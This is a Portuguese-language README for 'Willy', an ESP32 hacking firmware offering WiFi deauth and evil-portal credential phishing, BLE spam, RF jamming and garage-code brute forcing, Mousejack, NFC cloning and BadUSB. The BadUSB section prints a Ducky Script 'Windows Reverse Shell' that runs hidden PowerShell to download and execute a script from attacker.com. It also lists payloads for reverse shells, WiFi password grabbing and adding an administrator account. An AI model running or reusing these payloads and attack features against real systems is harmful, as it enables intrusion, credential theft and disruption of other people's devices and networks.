<div align="center">

# 📚 Willy Firmware - Documentação Completa

[![ESP32](https://img.shields.io/badge/ESP32-WROOM--32-red.svg)](https://www.espressif.com/products/socs/esp32)
[![Arduino](https://img.shields.io/badge/Arduino-C%2B%2B-blue.svg)](https://www.arduino.cc/)
[![C++](https://img.shields.io/badge/C%2B%2B-17-yellow.svg)](https://isocpp.org/)
[![Python](https://img.shields.io/badge/Python-3.9+-blue.svg)](https://www.python.org/)
[![WiFi](https://img.shields.io/badge/WiFi-802.11%20a/b/g/n/ac/ax-orange.svg)](https://en.wikipedia.org/wiki/IEEE_802.11)
[![Bluetooth](https://img.shields.io/badge/Bluetooth-5.0+-blue.svg)](https://www.bluetooth.com/)
[![NFC](https://img.shields.io/badge/NFC-ISO%2014443-green.svg)](https://www.nfc-forum.org/)
[![RFID](https://img.shields.io/badge/RFID-13.56%20MHz-purple.svg)](https://www.rfidjournal.com/)
[![Infravermelho](https://img.shields.io/badge/IR-38-40%20kHz-red.svg)](https://learn.adafruit.com/ir-sensor/overview)
[![Sub-GHz](https://img.shields.io/badge/Sub-GHz-315-915%20MHz-indigo.svg)](https://www.semtech.com/wireless-rf/sub-ghz)
[![GPS](https://img.shields.io/badge/GPS-NEO-6M-teal.svg)](https://www.u-blox.com/)
[![Hacking](https://img.shields.io/badge/Hacking-Espionagem-red.svg)](https://owasp.org/)
[![Red Team](https://img.shields.io/badge/Red%20Team-Penetration%20Testing-red.svg)](https://www.offensive-security.com/)
[![Blue Team](https://img.shields.io/badge/Blue%20Team-SOC%20Analysis-blue.svg)](https://www.sans.org/)
[![Pentest](https://img.shields.io/badge/Pentest-Ethical%20Hacking-orange.svg)](https://www.pentest-standard.org/)
[![Segurança](https://img.shields.io/badge/Segurança-Cybersecurity-green.svg)](https://www.cisa.gov/)
[![Forense](https://img.shields.io/badge/Forense-Digital%20Forensics-purple.svg)](https://www.dfrws.org/)
[![Wardriving](https://img.shields.io/badge/Wardriving-WiFi%20Scanning-cyan.svg)](https://www.wigle.net/)

<img src="../media/pictures/Willy_banner.jpg" alt="Willy Banner" width="500"/>

**Tudo que você precisa saber sobre o Willy Firmware**

</div>

---

> ⚠️ **AVISO LEGAL:** Este firmware é fornecido **exclusivamente para fins educacionais e de pesquisa em segurança**. O uso indevido pode ser ilegal. Use apenas em ambientes controlados e com autorização explícita. Os desenvolvedores não se responsabilizam pelo uso indevido deste software.

---

## 📑 Índice Completo

### 🚀 Primeiros Passos

- [Introdução](#-introdução)
- [Hardware Suportado](#-hardware-suportado)
- [Instalação](#-instalação)

### 📡 Módulos de Ataque

- [WiFi](#-wifi)
- [Bluetooth](#-bluetooth)
- [Infravermelho](#-infravermelho)
- [RF / Sub-GHz](#-rf--sub-ghz)
- [NRF24](#nrf24)
- [NFC / RFID](#-nfc--rfid)
- [BadUSB](#-badusb)
- [GPS](#-gps)

### 🏗️ Arquitetura e Otimizações

- [Diagramas de Arquitetura](architecture_diagrams.md)
- [📊 Otimizações Completas](otimizacoes_completas.md)
- [📖 Bíblia do Hardware (Guia Mestre de Fiação)](willy_hardware_bible.md)
- [Pinout Mestre ESP32-S3](pinout_master_s3_n8r2.md)

### 📖 Guias Avançados

- [Configuração](settings_guide.md)
- [Estrutura do Cartão SD](sd_card_structure.md)
- [Desenvolvimento](#-desenvolvimento)
- [Solução de Problemas (Troubleshooting)](troubleshooting.md)
- [FAQ](#-faq)

---

## 🚀 Introdução

### O que é o Willy Firmware?

**Willy** é um firmware proprietário multifuncional para ESP32 que transforma seu dispositivo em uma ferramenta completa de pesquisa em segurança. Inspirado em projetos como [Flipper Zero](https://flipperzero.one) e [Pwnagotchi](https://pwnagotchi.ai), o Willy oferece capacidades profissionais de segurança a um preço acessível.

### 🎯 Principais Características

<div align="center">

| Recurso | Descrição |
|---------|-----------|
| 🔴 **WiFi** | Ataques WPA2/WPA3, sniffers, evil portals |
| 🔵 **Bluetooth** | BLE spam, GATT attacks, device discovery |
| 🟠 **Infravermelho** | Controle universal, fuzzer, database |
| 🟢 **Sub-GHz** | CC1101, rolling code, jamming |
| 🟣 **NFC/RFID** | PN532, Mifare, emulação |
| 🟡 **BadUSB** | HID attacks, Ducky Script |
| ⚪ **GPS** | Wardriving, tracking |

</div>

### 📊 Comparativo

| Característica | Willy | Flipper Zero | Pwnagotchi |
|----------------|:-----:|:------------:|:----------:|
| WiFi Attacks | ✅ | ✅ | ✅ |
| Bluetooth/BLE | ✅ | ✅ | ❌ |
| Infravermelho | ✅ | ✅ | ❌ |
| Sub-GHz RF | ✅ | ✅ | ❌ |
| NFC/RFID | ✅ | ✅ | ❌ |
| BadUSB | ✅ | ✅ | ❌ |
| Touch Display | ✅ | ✅ | ❌ |
| Proprietário | ✅ | ✅ | ❌ |
| Preço Estimado | $15-50 | $169 | $80+ |
| Customização | ✅ Total | ⚠️ Limitada | ✅ Total |

---

## 🔧 Hardware Suportado

### 📱 Placas Oficiais

<div align="center">

| Placa | Display | Touch | SD | USB | Preço | Status |
|-------|---------|-------|-----|-----|-------|--------|
| **CYD-2432S028** | 3.5" TFT ILI9341 | Resistivo | ✅ | USB-C | ~$20 | ⭐ Recomendado |
| **CYD-2USB** | 3.5" TFT ILI9341 | Resistivo | ✅ | 2x USB-C | ~$25 | ⭐ Recomendado |
| **CYD-2432W328C** | 2.8" TFT | Capacitivo | ✅ | USB-C | ~$22 | ✅ Suportado |
| **CYD-3248S035R** | 3.5" TFT ST7796 | Resistivo (XPT2046) | ✅ | Micro-USB | ~$25 | ✅ Suportado |
| **CYD-3248S035C** | 3.5" TFT ST7796 | Capacitivo (GT911) | ✅ | Micro-USB | ~$25 | ✅ Suportado |
| **M5Stack Cardputer** | - | ❌ | ✅ | USB-C | ~$50 | ✅ Suportado |
| **M5Stack Core2** | 2.0" TFT | Capacitivo | ✅ | USB-C | ~$55 | ✅ Suportado |
| **M5Stack CoreS3** | 2.0" TFT | Capacitivo | ✅ | USB-C | ~$60 | ✅ Suportado |
| **M5Stack Stick S3** | 0.85" TFT | ❌ | ✅ | USB-C | ~$25 | ✅ Suportado |
| **Lilygo T-Embed CC1101** | 1.14" TFT | Rotary | ✅ | USB-C | ~$45 | ✅ Suportado |
| **Lilygo T-Display S3** | 1.9" TFT | ❌ | Opcional | USB-C | ~$25 | ✅ Suportado |
| **Lilygo T-Deck** | 2.8" TFT | Capacitivo | ✅ | USB-C | ~$80 | ✅ Suportado |
| **Lilygo T-Watch S3** | 1.78" TFT | Capacitivo | ✅ | USB-C | ~$70 | ✅ Suportado |
| **Lilygo T-Display TTGO** | 1.14" TFT | ❌ | ❌ | USB-C | ~$20 | ✅ Suportado |

</div>

### 🔌 Hardware Externo Suportado

<div align="center">

| Módulo | Função | Interface | Pinos | Preço |
|--------|--------|-----------|-------|-------|
| **CC1101** | Sub-GHz Transceiver | SPI | MOSI, MISO, SCK, CS, GDO0 | ~$3 |
| **NRF24L01+** | 2.4GHz Transceiver | SPI | MOSI, MISO, SCK, CS, CE | ~$2 |
| **NRF24L01+ PA+LNA** | Long-range 2.4GHz | SPI | MOSI, MISO, SCK, CS, CE | ~$8 |
| **PN532** | NFC/RFID Reader | I2C/SPI | SDA, SCL ou SPI | ~$8 |
| **RC522** | RFID Reader | SPI | MOSI, MISO, SCK, CS | ~$3 |
| **NEO-6M GPS** | GPS Module | UART | TX, RX | ~$10 |
| **NEO-8M GPS** | GPS Module | UART | TX, RX | ~$15 |
| **IR LED (940nm)** | Infravermelho TX | GPIO | 1 pino | ~$0.10 |
| **TSOP38238** | Infravermelho RX | GPIO | 1 pino | ~$0.50 |
| **W5500** | Ethernet | SPI | MOSI, MISO, SCK, CS, INT | ~$5 |
| **Si4713** | FM Transmitter | I2C | SDA, SCL, RST | ~$10 |

</div>

### 📐 Diagramas de Conexão

#### CC1101 com ESP32

```
CC1101       ESP32
────────────────────
VCC    →    3.3V
GND    →    GND
MOSI   →    GPIO 23
MISO   →    GPIO 19
SCK    →    GPIO 18
CS     →    GPIO 22
GDO0   →    GPIO 27
```

#### PN532 com ESP32 (I2C)

```
PN532       ESP32
────────────────────
VCC    →    3.3V
GND    →    GND
SDA    →    GPIO 21
SCL    →    GPIO 22
```

#### NEO-6M GPS com ESP32

```
NEO-6M      ESP32
────────────────────
VCC    →    3.3V
GND    →    GND
TX     →    GPIO 16 (RX)
RX     →    GPIO 17 (TX)
```

📖 **Guias detalhados:**

- [Wiring CC1101 e NRF24](cc1101_nrf24_wiring.md)
- [Hardware Externo Completo](hardware_externo.md)
- [GPS NEO-6M](gps_neo6m.md)
- [NFC PN532](nfc_pn532.md)

---

## 📡 WiFi

### 🛡️ Funcionalidades de Reconhecimento

#### Channel Analyzer

Analisa todos os canais WiFi (1-14) em tempo real:

| Informação | Descrição |
|------------|-----------|
| APs por canal | Quantidade de redes |
| Nível de ruído | Interferência RF |
| Contagem de pacotes | Tráfego total |
| Utilização | Porcentagem de uso |

```
Canal 1:  ████████░░ 8 APs
Canal 6:  ██████████████ 14 APs
Canal 11: ██████████ 10 APs
```

#### Packet Counter

Contagem em tempo real de pacotes:

| Tipo | Descrição |
|------|-----------|
| **Beacons** | Anúncios de APs |
| **Probe Requests** | Buscas de clientes |
| **Probe Responses** | Respostas de APs |
| **Data Frames** | Dados de usuário |
| **Management** | Quadros de gestão |
| **Control** | Quadros de controle |

#### Scan All Networks

Escaneamento completo de redes:

```
┌─────────────────────────────────────────┐
│ SSID              RSSI  CH  ENC         │
├─────────────────────────────────────────┤
│ Home_Network      -45   6   WPA2-PSK    │
│ ★ OPEN_WIFI       -58   1   OPEN       │
│ Neighbor_5G       -72   36  WPA3       │
│ ★ FreeInternet    -85   11  OPEN       │
└─────────────────────────────────────────┘
★ = Rede aberta
```

#### Detect Pwnagotchi

Identifica dispositivos Pwnagotchi:

- MAC address patterns
- Comportamento de advertising
- Identificação de handshake

#### Ping Scan / ARP Scan

Descoberta de hosts na rede:

```bash
# Ping Scan
192.168.1.1    - Gateway          2ms
192.168.1.100  - Desktop-PC       5ms
192.168.1.101  - iPhone-John      12ms
192.168.1.102  - Smart-TV         8ms

# ARP Scan (mais rápido)
192.168.1.255  - Broadcast
Found 15 devices
```

#### Port Scan

Varredura de portas comuns:

| Porta | Serviço | Descrição |
|-------|---------|-----------|
| 21 | FTP | File Transfer |
| 22 | SSH | Secure Shell |
| 23 | Telnet | Remote Terminal |
| 25 | SMTP | Mail Server |
| 53 | DNS | Domain Name |
| 80 | HTTP | Web Server |
| 110 | POP3 | Mail Protocol |
| 143 | IMAP | Mail Protocol |
| 443 | HTTPS | Secure Web |
| 445 | SMB | Windows Share |
| 3306 | MySQL | Database |
| 3389 | RDP | Remote Desktop |
| 5432 | PostgreSQL | Database |
| 5900 | VNC | Remote Desktop |
| 8080 | HTTP-Alt | Alternative HTTP |

### ⚔️ Ataques WiFi

#### Probe Request Flood

Envia probe requests com SSIDs aleatórios:

- Descobre redes ocultas
- Testa capacidade de processamento
- Mapeia dispositivos próximos

#### AP Clone Spam

Clona SSIDs de redes existentes:

```
Clonando redes:
[✓] Home_Network
[✓] Office_WiFi
[✓] Guest_Network
Enviando beacons em 3 canais...
```

#### Karma Attack

Responde automaticamente a probe requests:

- Usa SSIDs atrativos
- "Free WiFi", "Starbucks", "xfinitywifi"
- Atrai dispositivos a conectar automaticamente

#### Deauth Attack

Desconecta clientes de redes:

- Envia frames de deautenticação
- Força reautenticação
- Captura handshakes

#### Evil Portal

Cria portal captivo falso:

```
┌──────────────────────────────┐
│    ⚠️ ATENÇÃO ⚠️             │
│                              │
│ Sua conexão precisa ser      │
│ atualizada. Insira suas      │
│ credenciais para continuar.  │
│                              │
│ Usuário: [____________]      │
│ Senha:  [____________]       │
│                              │
│        [ CONECTAR ]          │
└──────────────────────────────┘
```

### 🎯 Ataques WiFi Avançados

| # | Ataque | Descrição |
|---|--------|-----------|
| 1 | **Dynamic Beacon Fuzzer** | Beacons malformados para crash |
| 2 | **Client Battery Drain** | PS-Poll spoofing |
| 3 | **Visual WiFi Heatmap** | Mapa de calor visual |
| 4 | **WPA3 Downgrade** | Força downgrade WPA2 |
| 5 | **IoT Exploit Injector** | Detecta e explora IoT |
| 6 | **Mesh Disruptor** | Quebra redes mesh |
| 7 | **Smart Deauth Scheduler** | Deauth programado |
| 8 | **Traffic Fingerprint** | Identifica OS |
| 9 | **Session Hijack Portal** | Rouba sessões |
| 10 | **Mgmt Frame Bypass** | Flood invisível a WIDS |

📖 **Guia completo:** [WiFi Advanced Attacks](wifi_advanced_attacks.md)

---

## 📱 Bluetooth

### 🔍 Descoberta e Análise

#### Bluetooth Scanner

Escaneia dispositivos Bluetooth/BLE:

```
┌─────────────────────────────────────────┐
│ Nome              MAC           RSSI    │
├─────────────────────────────────────────┤
│ iPhone de João    AA:BB:CC:...   -45    │
│ Galaxy S23        DD:EE:FF:...   -58    │
│ JBL Flip 5        11:22:33:...   -72    │
│ Unknown           44:55:66:...   -85    │
└─────────────────────────────────────────┘
```

#### Bluetooth Analyzer

Análise detalhada de pacotes:

- Advertising data
- Scan response
- Service UUIDs
- Manufacturer data
- TX Power level

#### Airtag Monitor

Monitora AirTags Apple:

- Public key tracking
- Location beacons
- Battery level
- Alertas de proximidade

#### Card Skimmer Detector

Detecta skimmers Bluetooth:

```
⚠️ ALERTA: Possível skimmer detectado!
MAC: AA:BB:CC:DD:EE:FF
Nome: HC-05
Risk Level: HIGH

Skimmers comuns usam:
- HC-05, HC-06 modules
- Nomes genéricos
- PIN padrão (1234, 0000)
```

#### BT Wardrive

Wardriving Bluetooth com GPS:

- Log automático
- Coordenadas GPS
- Export para Wigle.net

### 💥 Ataques BLE

#### BLE Spam

Spam de notificações para dispositivos:

| Tipo | Alvo |
|------|------|
| **Google BLE Spam** | Chromebooks, Pixels, Android |
| **Samsung BLE Spam** | Galaxy, Smart watches |
| **Swift Pair Spam** | Windows, Surface |
| **Flipper BLE Spam** | Flipper Zero devices |
| **BLE Spam All** | Todos os tipos combinados |

#### BlueDucky

Ataques HID via Bluetooth:

- Injeção de teclas remotas
- Ducky Script via BLE
- Não requer conexão USB

### 🎯 Ataques BLE Avançados

| # | Ataque | Descrição |
|---|--------|-----------|
| 1 | **Malformed ATT Fuzzer** | Crash de stacks |
| 2 | **GATT Phishing Server** | Emula serviços |
| 3 | **Advertisement Jammer** | Blackout BLE |
| 4 | **Connection Parameter Drain** | Drena bateria |
| 5 | **Mass AirTag Spoof** | AirTags falsos |
| 6 | **Long-Range Attack** | Ataques a 200m |
| 7 | **Pairing MITM** | Intercepta pairing |
| 8 | **Stealth Exfil** | Exfiltração via advertising |
| 9 | **Mesh Worm** | Propaga malware |
| 10 | **Disconnect Flood** | Desconecta dispositivos |

📖 **Guia completo:** [BLE Advanced Attacks](ble_advanced_attacks.md)

---

## 📡 Infravermelho

### 🎮 Funcionalidades

#### TV-B-Gone

Desliga TVs universalmente:

- 230+ códigos de desligamento
- Marcas: LG, Samsung, Sony, TCL, etc.
- Varredura automática

#### IR Custom

Envia códigos personalizados:

```
Protocolo: NEC
Endereço: 0x07
Comando: 0x02
Raw: 9000,4500,560,560,...
```

#### IR Reader

Captura códigos IR:

```
Detectado: NEC
Address: 0x07
Command: 0x02
Bits: 32
Raw data: 0x0207807F
```

### 📋 Banco de Dados IR

| Categoria | Marcas | Códigos |
|-----------|--------|---------|
| **TVs** | LG, Samsung, Sony, TCL, Philips, Sharp, Toshiba, Panasonic | 5,000+ |
| **ACs** | LG, Samsung, Midea, Gree, Daikin, Carrier, Fujitsu | 2,000+ |
| **Consoles** | Xbox, PlayStation, Nintendo | 500+ |
| **Audio** | Bose, Sonos, JBL, Harman Kardon | 1,000+ |
| **Universal** | Multi-marcas | 2,000+ |

### ⚙️ Configurações Avançadas do IR

O firmware Willy oferece configurações avançadas para otimizar a transmissão IR:

#### Modos de Operação

| Modo | Frequência | Duty Cycle | Indicação |
|------|------------|------------|-----------|
| **Padrão** | 38 kHz | 33% | Uso geral |
| **Avançado** | Configurável | Configurável | Otimizado |

#### Frequência de Modulação

| Opção | Dispositivos |
|-------|--------------|
| **36 kHz** | Philips RC-5, dispositivos antigos |
| **38 kHz** | **Maioria** (NEC, Samsung) |
| **40 kHz** | Sony SIRC |
| **Custom** | Casos especiais |

#### Duty Cycle

| Opção | Alcance | Características |
|-------|---------|-----------------|
| **33%** | Normal | Menor calor |
| **50%** | +50% | Máxima potência |

#### Preamble (Distância)

| Opção | Efeito |
|-------|--------|
| **Padrão** | Normal |
| **Longo** | +Distância |
| **Extra Longo** | Máximo alcance |

#### Filtro de Ruído

Filtre interferências em ambientes claros ou ruidosos:

- **Leve/Médio/Agressivo** - Ajustável

📖 **Guia completo:** [IR Advanced Attacks](ir_advanced_attacks.md)
📖 **Configuração:** [IR Configuração Avançada](ir_advanced_config.md)

---

## 📻 RF / Sub-GHz

### CC1101 Support

#### Frequências Suportadas

| Frequência | Região | Aplicações |
|------------|--------|------------|
| **315 MHz** | Ásia | Controles remotos |
| **390 MHz** | US | Key fobs |
| **433 MHz** | Mundial | Weather stations, doorbells |
| **434 MHz** | Mundial | Medical devices |
| **868 MHz** | Europa | IoT devices |
| **915 MHz** | US | IoT, LoRa |

#### Funcionalidades

| Função | Descrição |
|--------|-----------|
| **Transmit** | Envia sinais Raw |
| **Receive** | Captura sinais |
| **Scan** | Escaneia frequências |
| **Jammer** | Bloqueio de frequência |
| **Replay** | Reproduz capturas |
| **Rolling Code** | Analisa códigos |

### Rolling Code Analysis

Análise de códigos rolling (garagem):

```
Capturando códigos...
─────────────────────────────
Code 1: 0xA3B2C1D0 (FIX: 0xA3, HOP: B2C1D0)
Code 2: 0xA3B2C1D1 (FIX: 0xA3, HOP: B2C1D1)
Code 3: 0xA3B2C1D2 (FIX: 0xA3, HOP: B2C1D2)
─────────────────────────────
Padrão detectado:
- Fixed: 0xA3 (Device ID)
- Hopping: Incremental (+1)
- Next prediction: 0xA3B2C1D3
```

### 🎯 Ataques RF Avançados

| # | Ataque | Descrição |
|---|--------|-----------|
| 1 | **Adaptive Frequency Hopper** | Jamming adaptativo |
| 2 | **Predictive Garage Brute** | Brute force inteligente |
| 3 | **Stealth Low-Power Beacon** | Beacon discreto |
| 4 | **Coord. Replay Seq** | Sequenciador de sinais |
| 5 | **Smart Protocol Fuzzer** | Fuzzing avançado |
| 6 | **Alarm Trigger Loop** | Gatilho persistente |
| 7 | **TPMS Spoof Chaos** | Emula sensores de pneu |
| 8 | **Rolling Learner** | Captura e replay atrasado |
| 9 | **Spectrum Lock** | Visualizador com trava |
| 10 | **Sensor Drain Flood** | Exaustão de bateria |

📖 **Guia completo:** [RF Advanced Attacks](rf_advanced_attacks.md)

---

## 🔌 NRF24

### 2.4 GHz Transceiver

#### Funcionalidades

| Função | Descrição |
|--------|-----------|
| **Mousejack** | Exploits wireless |
| **Replay Attack** | Captura e reproduz |
| **Mass Pairing** | Pareamento em massa |
| **Channel Scanner** | Escaneia canais |
| **Device Fingerprint** | Identifica dispositivos |

#### Mousejack Attack

Explora vulnerabilidades em dispositivos sem fio:

```
Escaneando dispositivos vulneráveis...
─────────────────────────────────────
[!] Logitech MK270   CH: 5   Vulnerable
[!] Microsoft 1850   CH: 8   Vulnerable
[!] Dell WM126       CH: 3   Vulnerable
─────────────────────────────────────
Injetando payload...
[✓] Shell reverso executado
```

📖 **Guia completo:** [NRF24 Advanced Attacks](nrf24_advanced_attacks.md)

---

## 💳 NFC / RFID

### PN532 Support

#### Tipos de Tags Suportadas

| Tipo | Frequência | Alcance |
|------|------------|---------|
| **Mifare Classic 1K/4K** | 13.56 MHz | 5cm |
| **Mifare Ultralight** | 13.56 MHz | 5cm |
| **Mifare DESFire** | 13.56 MHz | 5cm |
| **NTAG213/215/216** | 13.56 MHz | 5cm |
| **ISO 14443-A/B** | 13.56 MHz | 5cm |
| **FeliCa** | 13.56 MHz | 5cm |

#### Operações

| Operação | Descrição |
|----------|-----------|
| **Read** | Lê dados da tag |
| **Write** | Escreve dados |
| **Emulate** | Emula uma tag |
| **Clone** | Clona tag completa |
| **Format** | Formata tag |

### Exemplo de Leitura

```
Escaneando tag NFC...
─────────────────────────────────
UID: 04:A3:B2:C1:D0:E1
ATQA: 0x4400
SAK: 0x08
Type: Mifare Classic 1K
─────────────────────────────────
Sector 0 (Manufacturer):
  04A3B2C1 D0E10804 44000800 00000000
Sector 1 (Data):
  54657374 65206461 646F7320 64652074
  ...
```

### 🎯 Ataques NFC Avançados

| # | Ataque | Descrição |
|---|--------|-----------|
| 1 | **Real-Time Relay MITM** | Relay de APDUs |
| 2 | **APDU Fuzzer** | Fuzzing de comandos |
| 3 | **Dynamic UID Collision** | Múltiplos cartões |
| 4 | **NDEF Stealth Exfil** | Exfiltração NDEF |
| 5 | **MIFARE Rainbow Table** | Recupera chaves |
| 6 | **Live Data Injection** | Manipulação em tempo real |
| 7 | **Chameleon Ultra Mode** | Ciclo automático |
| 8 | **Skimmer Hunter Pro** | Detector de skimmers |
| 9 | **UID Obfuscator** | UID randomizado |
| 10 | **NFC Worm Propagator** | Propagação de payload |

📖 **Guia completo:** [NFC Advanced Attacks](nfc_advanced_attacks.md)

---

## ⌨️ BadUSB

### HID Attacks

#### Ducky Script

Sintaxe compatível com Hak5:

```d
// Windows Reverse Shell
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')
ENTER
```

#### Comandos Disponíveis

| Comando | Descrição |
|---------|-----------|
| `DELAY n` | Aguarda n milissegundos |
| `STRING texto` | Digita texto |
| `ENTER` | Tecla Enter |
| `TAB` | Tecla Tab |
| `GUI` | Tecla Windows/Command |
| `SHIFT` | Tecla Shift |
| `CTRL` | Tecla Control |
| `ALT` | Tecla Alt |
| `DOWNARROW` | Seta para baixo |
| `UPARROW` | Seta para cima |
| `LEFTARROW` | Seta esquerda |
| `RIGHTARROW` | Seta direita |

### Payloads Incluídos

| Payload | Plataforma | Função |
|---------|------------|--------|
| `windows_recon.txt` | Windows | Reconhecimento |
| `windows_wifi_grab.txt` | Windows | Captura WiFi |
| `windows_reverse_shell.txt` | Windows | Reverse shell |
| `windows_add_admin.txt` | Windows | Cria admin |
| `linux_recon.txt` | Linux | Reconhecimento |
| `macos_recon.txt` | macOS | Reconhecimento |
| `rickroll.txt` | Universal | Rickroll |

📖 **Guia completo:** [BadUSB HID Attacks](badusb_hid_attacks.md)

---

## 🗺️ GPS

### NEO-6M/NEO-8M Support

#### Funcionalidades

| Função | Descrição |
|--------|-----------|
| **Wardriving** | Log WiFi + GPS |
| **Tracking** | Rastreamento |
| **Speed/Heading** | Velocidade e direção |
| **Coordinates** | Coordenadas atuais |

#### Wardriving

Exporta em formatos compatíveis:

| Formato | Uso |
|---------|-----|
| **CSV** | Planilhas |
| **JSON** | Programação |
| **Wigle.net** | Upload direto |
| **KML** | Google Earth |

#### Exemplo de Log

```csv
MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type
AA:BB:CC:DD:EE:FF,Home_Network,[WPA2-PSK-CCMP][ESS],2026-02-23 15:30:45,6,-45,-23.5505,-46.6333,760,10,WIFI
```

### ⚙️ Configurações Avançadas do GPS

O firmware Willy oferece configurações avançadas para otimizar o módulo GPS NEO-6M:

#### Modos de Operação

| Modo | Taxa | Energia | Indicação |
|------|------|---------|-----------|
| **Padrão** | 1 Hz | Normal | Uso geral |
| **Avançado** | 1-10 Hz | Configurável | Otimizado |

#### Taxa de Update (Avançado)

| Opção | Indicação |
|-------|-----------|
| **1 Hz** | Uso geral, economia |
| **2 Hz** | Pedestre |
| **5 Hz** | **Wardriving** (recomendado) |
| **10 Hz** | Alta velocidade |

#### Modo de Energia

| Opção | Consumo |
|-------|---------|
| **Max Desempenho** | ~45mA |
| **Eco** | ~20mA |
| **Power Save** | ~10-200µA |

#### Filtro de Satélites

Filtre sinais fracos para melhor precisão em ambientes urbanos:

- **25-40 dB-Hz** - Ajustável

📖 **Guia completo:** [GPS NEO-6M Configuração Avançada](gps_neo6m.md)

---

## ⚙️ Configuração

### Interface

| Configuração | Opções |
|--------------|--------|
| **Brilho** | 0-100% |
| **Tema** | Escuro, Claro, Customizado |
| **Timer de Sleep** | 1min - 30min |
| **Orientação** | Retrato, Paisagem |

### Rede

| Configuração | Descrição |
|--------------|-----------|
| **MAC Spoofing** | Altera o endereço MAC |
| **Conf. WiFi** | Redes salvas e conexão |
| **Conf. AP** | Modo Ponto de Acesso |

### Hardware

| Configuração | Descrição |
|--------------|-----------|
| **Pino IR TX** | Pino do LED transmissor |
| **Pino IR RX** | Pino do receptor infravermelho |
| **Conf. RF** | Configurações do CC1101 |
| **Conf. NFC** | Configurações do PN532 |

---

## 👨‍💻 Desenvolvimento

### Compilação

```bash
# Instale PlatformIO
pip install platformio

# Clone o repositório
git clone https://github.com/lelebrr/Willy_ESP_s3
cd Willy_ESP_s3

# Compile para seu dispositivo
pio run -e CYD-2USB

# Upload
pio run -e CYD-2USB --target upload

# Monitor serial
pio device monitor
```

### Estrutura do Projeto

```
Willy/
├── src/
│   ├── core/           # Núcleo do sistema
│   │   ├── display.cpp # Gerenciamento de display
│   │   ├── mykeyboard.cpp # Entrada (touch/botões)
│   │   ├── sd_functions.cpp # Funções SD
│   │   └── serialcmds.cpp # Comandos seriais
│   ├── modules/        # Módulos funcionais
│   │   ├── wifi/       # Ataques WiFi
│   │   ├── ble/        # Ataques Bluetooth
│   │   ├── ir/         # Infravermelho
│   │   ├── rf/         # Sub-GHz RF
│   │   ├── rfid/       # NFC/RFID
│   │   ├── badusb_ble/ # BadUSB & BLE HID
│   │   └── gps/        # GPS/Wardriving
│   └── main.cpp        # Ponto de entrada
├── boards/             # Configurações de placas
├── lib/                # Bibliotecas customizadas
├── include/            # Header files
├── docs/               # Documentação
├── sd_files/           # Arquivos para SD
└── platformio.ini      # Configuração PlatformIO
```

### Criando Novos Módulos

1. Crie pasta em `src/modules/seumodulo/`
2. Implemente funções em `.cpp` e `.h`
3. Adicione ao menu em `main.cpp`
4. Atualize documentação

---

## 🔧 Troubleshooting

### Problemas Comuns

| Problema | Solução |
|----------|---------|
| **Não compila** | Verifique PlatformIO e dependências |
| **Tela branca** | Verifique conexões do display |
| **SD não monta** | Formate em FAT32 |
| **IR não funciona** | Verifique pino e resistor |
| **NFC não lê** | Verifique conexões I2C/SPI |
| **GPS sem sinal** | Vá para área aberta |

### Debug Serial

```bash
# Monitor serial com debug
pio device monitor -b 115200 --filter esp32_exception_decoder
```

---

## ❓ FAQ

### Perguntas Frequentes

**Q: Qual placa devo comprar?**
> R: Para iniciantes, recomendamos o CYD-2432S028 (~$20) pela excelente relação custo-benefício.

**Q: Preciso de SD card?**
> R: O SD card é necessário para salvar capturas, carregar payloads e usar o wardriving.

**Q: Posso usar em produção?**
> R: Não recomendado. O firmware é para pesquisa e educação.

**Q: Como adiciono novos dispositivos?**
> R: Crie uma nova pasta em `boards/` com os arquivos de configuração.

---

## 📜 Licença

**Willy Firmware** é protegido por uma licença proprietária restrita. O uso, modificação, distribuição ou reprodução não autorizada é estritamente proibido e pode resultar em ações legais.

### Termos de Uso

1. **Licenciamento**: Este software é fornecido "como está", sem garantias de qualquer tipo.
2. **Uso Restrito**: O uso deste software é limitado a ambientes controlados e autorizados.
3. **Responsabilidade**: Os desenvolvedores não se responsabilizam por quaisquer danos resultantes do uso deste software.
4. **Modificação**: Qualquer modificação no código fonte requer aprovação prévia por escrito.
5. **Distribuição**: A distribuição deste software é estritamente proibida sem autorização explícita.

### Limitações de Responsabilidade

EM NENHUMA CIRCUNSTÂNCIA, OS DESENVOLVEDORES OU DETENTORES DE DIREITOS AUTORAIS SERÃO RESPONSÁVEIS POR QUAISQUER DANOS DIRETOS, INDIRETOS, INCIDENTAIS, ESPECIAIS, EXEMPLARES OU CONSEQUENTES, CAUSADOS POR OU RELACIONADOS AO SOFTWARE OU AO USO OU OUTRAS NEGOCIAÇÕES NO SOFTWARE.

### Direitos Autorais

© 2024 Willy Firmware. Todos os direitos reservados.

### Contato

Para informações sobre licenciamento comercial ou autorizações especiais, entre em contato através dos canais oficiais do projeto.

---

<div align="center">

### 🛡️ Willy Firmware

**[⬆ Voltar ao Topo](#-Willy-firmware---documentação-completa)**

*Desenvolvido por equipe especializada em segurança cibernética*

</div>
